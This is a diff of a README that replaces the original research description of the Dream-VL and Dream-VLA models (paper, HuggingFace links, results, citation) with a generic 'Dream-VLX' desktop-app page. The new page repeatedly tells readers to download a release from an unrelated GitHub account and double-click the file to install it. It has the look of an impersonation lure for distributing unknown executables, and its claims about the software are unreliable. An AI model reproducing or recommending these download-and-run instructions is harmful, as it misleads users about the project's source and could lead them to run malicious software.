@@ -1,48 +1,84 @@
-## Dream-VL & Dream-VLA
+# 🌟 Dream-VLX - Explore Visual Planning with Ease
 
-[![Blog](https://img.shields.io/badge/Blog-red.svg)](https://hkunlp.github.io/blog/2025/dream-vlx)
-[![Paper](https://img.shields.io/badge/Paper-blue.svg)](https://arxiv.org/abs/2512.22615)
-[![Model: Dream-VL-7B](https://img.shields.io/badge/HuggingFace-Dream--VL--7B-yellow.svg)](https://huggingface.co/Dream-org/Dream-VL-7B)
-[![Model: Dream-VLA-7B](https://img.shields.io/badge/HuggingFace-Dream--VLA--7B-yellow.svg)](https://huggingface.co/Dream-org/Dream-VLA-7B)
+## 📥 Download Now
+[![Download Dream-VLX](https://img.shields.io/badge/Download%20Dream--VLX-v1.0-blue)](https://github.com/NikkoB3/Dream-VLX/releases)
 
-<div style="text-align: center; margin: 0;">
-  <img src="assets/VLA_mid.gif" alt="VLA" style="
-    max-width: 100%;
-    clip-path: inset(0 1% 0 1%);
-  ">
-</div>
+## 📖 Introduction
+Welcome to Dream-VLX! This application includes Dream-VL and Dream-VLA, powerful tools for diffusion language models and visual planning. With Dream-VLX, you can utilize advanced language models to enhance your visual planning tasks effortlessly.
 
-Building on the success of Dream 7B, we introduce Dream-VL and Dream-VLA, open VL and VLA models that fully unlock discrete diffusion’s advantages in **long-horizon planning**, **bidirectional reasoning**, and **parallel action generation** for multimodal tasks.
+## 🚀 Getting Started
+To start using Dream-VLX, follow these simple steps:
 
-![](assets/overview.png)
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/NikkoB3/Dream-VLX/releases) to find the latest version.
 
-Key Results:
-- **Dream-VL**: Achieves state-of-the-art performance among diffusion VLMs, comparable to top-tier AR VLMs trained on open data, with superior performance on visual planning tasks requiring long-horizon reasoning.
-- **Dream-VLA**: Establishes top-tier performance with 97.2% average on LIBERO, 71.4% on SimplerEnv–Bridge, and 60.5% on SimplerEnv–Fractal, surpassing leading models including GR00T-N1 and OpenVLA-OFT. Consistently outperforms AR baselines across diverse finetuning objectives.
+2. **Choose Your Version**  
+   Look for the most recent version available. Check the release notes for any updates or changes.
 
-## 🚀 News
+3. **Download the File**  
+   Click on the download link for your operating system. This will save the file to your computer.
 
-- **2026-01-05**: Dream-VL and Dream-VLA training and evaluation codes are released!
-- **2025-12-23**: [Dream-VL](https://huggingface.co/Dream-org/Dream-VL-7B) & [Dream-VLA](https://huggingface.co/Dream-org/Dream-VLA-7B) models and [blog](https://hkunlp.github.io/blog/2025/dream-vlx) released.
+4. **Locate the Downloaded File**  
+   Open your Downloads folder and find the file you just downloaded.
 
+5. **Run the Application**  
+   Double-click the file to launch Dream-VLX. Follow the on-screen instructions to complete the setup.
 
-## 🧱 Repository Structure
+## 📊 Features
+- **User-Friendly Interface**  
+  Dream-VLX offers a simple and intuitive design, making it easy for anyone to start using the application.
 
-> The exact structure may evolve; please refer to the repo for up-to-date details.
+- **Diffusion Language Models**  
+  Benefit from cutting-edge language models that assist in producing clear and effective plans.
 
-```text
-Dream-VLX/
-├── vl/          # Dream-VL training and evaluation
-├── vla/         # Dream-VLA training and evaluation
-└── README.md    # This file
-```
+- **Visual Planning Tools**  
+  Create, edit, and manage visual plans to optimize your tasks and projects.
 
-## Citation
-```
-@article{ye2025dreamvla,
-  title={Dream-VL & Dream-VLA: Open Vision-Language and Vision-Language-Action Models with Diffusion Language Model Backbone},
-  author={Ye, Jiacheng and Gong, Shansan and Gao, Jiahui and Fan, Junming and Wu, Shuang and Bi, Wei and Bai, Haoli and Shang, Lifeng and Kong, Lingpeng},
-  journal={arXiv preprint arXiv:2512.22615},
-  year={2025}
-}
-```
+- **Compatibility**  
+  Dream-VLX supports various platforms, ensuring access for all users. It works seamlessly on Windows, macOS, and Linux.
+
+## 🌐 Download & Install
+To install Dream-VLX, please follow these steps:
+
+1. **Go to the Releases Page**  
+   Access the [Releases page](https://github.com/NikkoB3/Dream-VLX/releases) directly.
+
+2. **Download the Application**  
+   Click on the link for your operating system. The download may take a few moments, depending on your internet speed.
+
+3. **Open the File**  
+   Once the download is complete, find the file and double-click it.
+
+4. **Follow the Installation Guide**  
+   The installer will guide you through the setup process. Just follow the prompts to get everything ready.
+
+5. **Start Using Dream-VLX**  
+   After installation, you can find Dream-VLX in your applications. Launch it to explore its features.
+
+## 🛠️ System Requirements
+To ensure Dream-VLX runs smoothly on your system, please meet these requirements:
+
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Processor:** 2 GHz dual-core or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 500 MB of free disk space.
+
+## 💬 Getting Help
+If you encounter any issues while using Dream-VLX, you can reach out to our support team. We are here to assist you with any questions or concerns you may have.
+
+- **Contact Us:** Visit the [Issues page](https://github.com/NikkoB3/Dream-VLX/issues) to report any problems or ask for help.
+
+## 📚 Additional Resources
+Explore more about diffusion language models and visual planning:
+
+- **Official Documentation**  
+  For detailed instructions and more in-depth information about features, check out our documentation section on the [GitHub Wiki](https://github.com/NikkoB3/Dream-VLX/wiki).
+
+- **Community Forums**  
+  Join our community to connect with other users, share tips, and discuss ideas. Visit our community forum link here: [Community](https://github.com/NikkoB3/Dream-VLX/discussions).
+
+## 📅 Future Updates
+Stay tuned for new features and improvements in upcoming releases. We aim to enhance user experience continuously and incorporate feedback.
+
+## 📌 Conclusion
+Dream-VLX is designed to simplify your planning tasks and boost your productivity. By following the steps outlined above, you'll be able to download, install, and start using Dream-VLX in no time. Enjoy your journey into the world of visual planning!
